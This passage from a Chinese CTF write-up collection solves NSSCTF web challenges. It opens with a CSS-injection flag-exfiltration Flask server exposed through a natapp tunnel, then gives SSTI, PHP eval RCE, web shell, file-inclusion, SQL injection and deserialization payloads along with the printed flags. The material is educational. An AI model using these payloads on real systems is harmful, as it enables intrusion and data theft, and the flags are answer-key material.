def generate_css():
    global result
    css_content = ""
    for char in dic:
        current_prefix = result + char
        css_content += f'input[name="flag"][value^="{current_prefix}"] {{background: url("/check?prefix={current_prefix}");}}\n'
    return Response(css_content, mimetype="text/css")

@app.route('/check')
def check_flag():
    global result
    prefix = request.args.get('prefix', '')
    
    if any(bad in prefix for bad in BAD_PREFIXES):
        return ""
    
    if len(prefix) > len(result) and prefix.startswith(result):
        result = prefix
        print(f"{result}")
        if result.endswith('}'):
            print(result)
    return ""

@app.route('/favicon.ico')
def favicon():
    return "", 204

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8000, debug=False)
```

**内网穿透**

**config.ini**

```shell
[default]
authtoken=[你natapp隧道的token]
clientip=127.0.0.1
clientport=8000
```

```shell
natapp.exe
```

```shell
Powered By NATAPP       Please visit https://natapp.cn                                                  (Ctrl+C to Quit)

Tunnel Status           Online

Version                 3.0.1

Forwarding              http://u6265ecc.natappfree.cc -> http://127.0.0.1:8000

Web Interface           http://127.0.0.1:4040

Total Connections       42
```

**开放端口**

```shell
python -m http.server 8000
```

```shell
Serving HTTP on :: port 8000 (http://[::]:8000/) ...
```

**运行脚本**

```shell
python app.py
```

```shell
 * Serving Flask app 'app'
 * Debug mode: off
```

**执行爆破**

```shell
?css=http://u6265ecc.natappfree.cc/poc.css
```

#### 题目答案

```shell
NSSCTF{d3729e9
127.0.0.1 - - [19/Mar/2026 20:35:40] "GET /check?prefix=NSSCTF{d3729e9 HTTP/1.1" 200 -
127.0.0.1 - - [19/Mar/2026 20:36:34] "GET /poc.css HTTP/1.1" 200 -
NSSCTF{d3729e9a
127.0.0.1 - - [19/Mar/2026 20:36:34] "GET /check?prefix=NSSCTF{d3729e9a HTTP/1.1" 200 -
```

**得到：NSSCTF{d3729e9a...}**



### [SCTF 2021]loginme

#### 题目信息

> [SCTF 2021]loginme
>
> 
>
> 1分
>
> SSTI代码审计WEB
>
> 
>
> 
>
> 题目描述
>
> I don't know the age of the admin, can you tell me?
> By the way, admin's Password maybe the thing you want
> 得到的flag使用NSSCTF{}格式提交。

#### 解题过程

```shell
http://node4.anna.nssctf.cn:25280/admin/index?id=0&age={{.Password}}
```

```shell
X-Real-IP: 127.0.0.1
```

```shell
Hello Admin
Your Age: SCTF{E@zy_SIGn_Ch3eR!}
```

#### 题目答案

**得到：NSSCTF{E@zy_SIGn_Ch3eR!}**



### [SWPUCTF 2021 新生赛]easyrce

#### 题目信息

> [SWPUCTF 2021 新生赛]easyrce
>
> 
>
> 1分
>
> RCEPHP无回显RCE
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看题目**

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?>
```

#### 题目答案

```shell
?url=system('cat /f*');
```

```shell
NSSCTF{f8a319d9-34d2-40b2-bf0c-f35a0e1f3ae8}
```

**得到：NSSCTF{f8a319d9-34d2-40b2-bf0c-f35a0e1f3ae8}**



### [SWPUCTF 2021 新生赛]caidao

#### 题目信息

> [SWPUCTF 2021 新生赛]caidao
>
> 
>
> 1分
>
> RCEPHP信息收集
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看题目**

```shell
@eval($_POST['wllm']);
```

**分析**

- **用POST发送请求**
- **键为wllm**
- **值为system('cat /f*');**
- **注意加`;`**

#### 题目答案

```shell
wllm=system('cat /f*');
```

```shell
NSSCTF{e843f9f6-5a65-4ead-9120-b2516b58adee}
```

**得到：NSSCTF{e843f9f6-5a65-4ead-9120-b2516b58adee}**



### [SWPUCTF 2021 新生赛]gift_F12

#### 题目信息

> [SWPUCTF 2021 新生赛]gift_F12
>
> 1分
>
> 信息收集JS分析源码泄漏
>
> 
>
> 
>
> 题目描述
>
> flag以NSSCTF{}形式提交

#### 解题过程

**查看源码**

```js
<script language="javascript">
    function show_date_time() {
        flag = "WLLMCTF{We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft}"//flag is here
```

#### 题目答案

**得到：NSSCTF{We1c0me_t0_WLLMCTF_Th1s_1s_th3_G1ft}**



### [SWPUCTF 2021 新生赛]easy_md5

#### 题目信息

> [SWPUCTF 2021 新生赛]easy_md5
>
> 1分
>
> 弱比较PHP数组绕过
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看题目**

```php
<?php 
 highlight_file(__FILE__);
 include 'flag2.php';
 
if (isset($_GET['name']) && isset($_POST['password'])){
    $name = $_GET['name'];
    $password = $_POST['password'];
    if ($name != $password && md5($name) == md5($password)){
        echo $flag;
    }
    else {
        echo "wrong!";
    }
 
}
else {
    echo 'wrong!';
}
?>
```

**分析**

- **$name != $password && md5($name) == md5($password)**
- **md5弱碰撞**

#### 题目答案

**数组绕过**

```shell
http://node7.anna.nssctf.cn:27160/?name[]=0
POST password[]=1
```

```shell
NSSCTF{bc983573-629c-4055-b07e-9307566a8eba}
```

**得到：NSSCTF{bc983573-629c-4055-b07e-9307566a8eba}**



### [SWPUCTF 2021 新生赛]include

#### 题目信息

> [SWPUCTF 2021 新生赛]include
>
> 1分
>
> PHP伪协议PHP文件包含
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看题目**

```shell
传入一个file试试
```

```shell
http://node7.anna.nssctf.cn:22382/?file
```

```php
<?php
ini_set("allow_url_include","on");
header("Content-type: text/html; charset=utf-8");
error_reporting(0);
$file=$_GET['file'];
if(isset($file)){
    show_source(__FILE__);
    echo 'flag 在flag.php中';
}else{
    echo "传入一个file试试";
}
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
echo "</br>";
include_once($file);
?> flag 在flag.php中
```

**分析**

- **include_once($file)**
- **文件包含漏洞**

#### 题目答案

**最终请求**

```shell
http://node7.anna.nssctf.cn:22382/?file=php://filter/convert.base64-encode/resource=flag.php
```

```shell
PD9waHANCiRmbGFnPSdOU1NDVEZ7M2RmMTE0ZjktNjFmOS00YTljLTlhODktZGJjZGY3MDZiMGU1fSc7
```

```shell
<?php
$flag='NSSCTF{3df114f9-61f9-4a9c-9a89-dbcdf706b0e5}';
```

**得到：NSSCTF{3df114f9-61f9-4a9c-9a89-dbcdf706b0e5}**



### [SWPUCTF 2021 新生赛]easy_sql

#### 题目信息

> [SWPUCTF 2021 新生赛]easy_sql
>
> 1分
>
> SQL注入报错注入布尔盲注
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

```sql
' or true --+
' order by 3 --+
' union select 1,2,database() --+
' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='test_db' --+
' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='test_db' --+
' union select 1,2,flag from test_tb --+
```

```shell
Your Password:NSSCTF{853611b0-db76-4401-a325-660da243140d}
```

#### 题目答案

**得到：NSSCTF{853611b0-db76-4401-a325-660da243140d}**



### [LitCTF 2023]我Flag呢？

#### 题目信息

> [LitCTF 2023]我Flag呢？
>
> 1分
>
> 信息收集源码泄漏代码审计
>
> 
>
> 
>
> 题目描述
>
> 奇怪，放哪里了，怎么看不见呢？（初级难度）

#### 解题过程

**查看源码**

```shell
F12+I || 鼠标右键+检查
点击源码
代码审计
```

```shell
<!--flag is here flag=NSSCTF{03e06097-2698-44db-884b-bb872db1d484} -->
```

#### 题目答案

**得到：NSSCTF{03e06097-2698-44db-884b-bb872db1d484}**



### [suctf 2019]EasySQL

#### 题目信息

> [suctf 2019]EasySQL
>
> 1分
>
> 堆叠注入SQL注入关键字绕过
>
> 
>
> 
>
> 题目描述
>
> 该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系管理员删除。

#### 解题过程

**查看题目**

```shell
Give me your flag, I will tell you if the flag is right.
```

**分析**

- 常规**`'`**不行
- 宽体注入不行
- 尝试堆叠注入

#### 题目答案

```shell
9;set sql_mode=PIPES_AS_CONCAT;select 9
```

```shell
Array ( [0] => 9 ) Array ( [0] => 9NSSCTF{57838d87-4ce7-488a-ad01-7b90dec5e95e} )
```

**分析**

- 关于sql_mode：https://www.cnblogs.com/piperck/p/9835695.html

**得到：NSSCTF{57838d87-4ce7-488a-ad01-7b90dec5e95e}**



### [SWPUCTF 2021 新生赛]Do_you_know_http

#### 题目信息

> [SWPUCTF 2021 新生赛]Do_you_know_http
>
> 
>
> 1分
>
> HTTP协议信息收集PHP
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看题目**

```shell
使用WLLM浏览器
```

```
User-Agent WLLM
```

```shell
使用本地地址
```

```shell
X-Forwarded-For 127.0.0.1
```

#### 题目答案

**得到：NSSCTF{4aaf61e3-4e08-49bc-bb64-da134869bebe}**



### [SWPUCTF 2021 新生赛]ez_unserialize

#### 题目信息

> [SWPUCTF 2021 新生赛]ez_unserialize
>
> 1分
>
> 反序列化PHPJava反序列化
>
> 
>
> 
>
> 题目描述
>
> 无描述

#### 解题过程

**查看题目**

```shell
/robots.txt
```

```shell
User-agent: *
Disallow: /cl45s.php
```

```shell
/cl45s.php
```

```shell
<?php

error_reporting(0);
show_source("cl45s.php");

class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = $_GET['p'];
unserialize($p);

?>
```

**编写脚本**

```php
<?php
class wllm{

    public $admin;
    public $passwd;

    public function __construct(){
        $this->admin ="user";
        $this->passwd = "123456";
    }

        public function __destruct(){
        if($this->admin === "admin" && $this->passwd === "ctf"){
            include("flag.php");
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = new wllm();
$p->admin = "admin";
$p->passwd = "ctf";
echo serialize($p);
?>
```

```shell
O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
Warning: include(flag.php): failed to open stream: No such file or directory in /box/script.php on line 14

Warning: include(): Failed opening 'flag.php' for inclusion (include_path='.:') in /box/script.php on line 14
```

**发送请求**

```shell
?p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

```shell
NSSCTF{d41e5569-12e1-4fed-9872-a766065ec184}
```

#### 题目答案

**得到：NSSCTF{d41e5569-12e1-4fed-9872-a766065ec184}**
